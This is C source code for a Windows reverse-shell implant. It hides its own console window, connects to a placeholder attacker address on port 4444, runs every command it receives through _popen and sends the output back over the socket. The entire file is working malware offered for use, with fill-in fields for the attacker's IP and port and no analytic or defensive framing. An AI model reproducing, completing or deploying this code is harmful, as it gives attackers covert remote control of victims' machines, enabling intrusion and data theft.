#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h> 

#pragma comment(lib, "ws2_32.lib")

void hideConsole() {
    HWND hwnd = GetConsoleWindow(); 
    ShowWindow(hwnd, SW_HIDE);    
}

int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nCmdShow) {
    hideConsole();

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return 1;
    }

    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(4444); // Enter port
                            // Enter IP/Hostname
    if (InetPton(AF_INET, "<IP/Hostname>", &server.sin_addr) <= 0) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    char* buffer = (char*)malloc(65536 * sizeof(char));
    char* sendBuffer = (char*)malloc(65536 * sizeof(char));
    if (buffer == NULL || sendBuffer == NULL) {
        closesocket(sock);
        WSACleanup();
        return 1; 
    }

    int bytesRead;

    while ((bytesRead = recv(sock, buffer, 65535, 0)) > 0) {
        buffer[bytesRead] = '\0';

        FILE* fp;

        fp = _popen(buffer, "r");
        if (fp == NULL) {
            strcpy_s(sendBuffer, 65536, "Error executing command\n");
            send(sock, sendBuffer, (int)strlen(sendBuffer), 0);
            continue;
        }

        while (fgets(sendBuffer, 65536, fp) != NULL) {
            send(sock, sendBuffer, (int)strlen(sendBuffer), 0);
        }

        _pclose(fp);
    }

    free(buffer);
    free(sendBuffer);

    closesocket(sock);
    WSACleanup();
    return 0;
}
